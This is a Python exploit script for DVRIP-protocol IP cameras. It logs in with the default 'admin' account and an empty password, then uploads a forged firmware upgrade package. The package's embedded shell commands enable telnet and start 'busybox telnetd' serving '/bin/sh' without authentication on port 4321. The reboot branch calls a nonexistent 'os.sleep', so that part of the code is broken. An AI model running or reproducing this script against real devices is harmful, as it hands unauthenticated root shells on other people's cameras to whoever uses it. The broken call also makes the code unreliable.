#!/usr/bin/env python3

from dvrip import DVRIPCam
import argparse
import json
import os
import socket
import zipfile

TELNET_PORT = 4321


def make_zip(filename, data):
    zipf = zipfile.ZipFile(filename, "w", zipfile.ZIP_DEFLATED)
    zipf.writestr("InstallDesc", data)
    zipf.close()


def check_port(host_ip, port):
    a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result_of_check = a_socket.connect_ex((host_ip, port))
    return result_of_check == 0


def extract_gen(swver):
    return swver.split(".")[3]


def open_telnet(host_ip, port, do_reboot):
    cam = DVRIPCam(host_ip, user="admin", password="")
    if not cam.login():
        print(f"Cannot connect {host_ip}")
        return
    upinfo = cam.get_upgrade_info()
    hw = upinfo["Hardware"]
    print(f"Modifiying camera {hw}")
    sysinfo = cam.get_system_info()
    swver = extract_gen(sysinfo["SoftWareVersion"])
    print(f"Firmware generation {swver}")

    armbenv = {
        "Command": "Shell",
        "Script": "armbenv -s xmuart 0; armbenv -s telnetctrl 1",
    }
    telnetd = {
        "Command": "Shell",
        "Script": f"busybox telnetd -F -p {port} -l /bin/sh",
    }
    desc = {
        "UpgradeCommand": [armbenv, telnetd],
        "Hardware": hw,
        "DevID": f"{swver}1001000000000000",
        "CompatibleVersion": 2,
        "Vendor": "General",
        "CRC": "1ce6242100007636",
    }
    zipfname = "upgrade.bin"
    make_zip(zipfname, json.dumps(desc, indent=2))
    cam.upgrade(zipfname)
    cam.close()
    os.remove(zipfname)
    if do_reboot:
        os.sleep(10)
        cam = DVRIPCam(host_ip, user="admin", password="")
        cam.login()
        cam.reboot()
        cam.close()
        print("Camera has been rebooted")
        return

    if check_port(host_ip, port):
        print(f"Now use 'telnet {host_ip} {port}' to login")
    else:
        print("Something went wrong")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("hostname", help="Camera IP address or hostname")
    parser.add_argument("-r", "--reboot", action="store_true",
                        help="Reboot camera after make changes")
    args = parser.parse_args()
    open_telnet(args.hostname, TELNET_PORT, args.reboot)


if __name__ == "__main__":
    main()
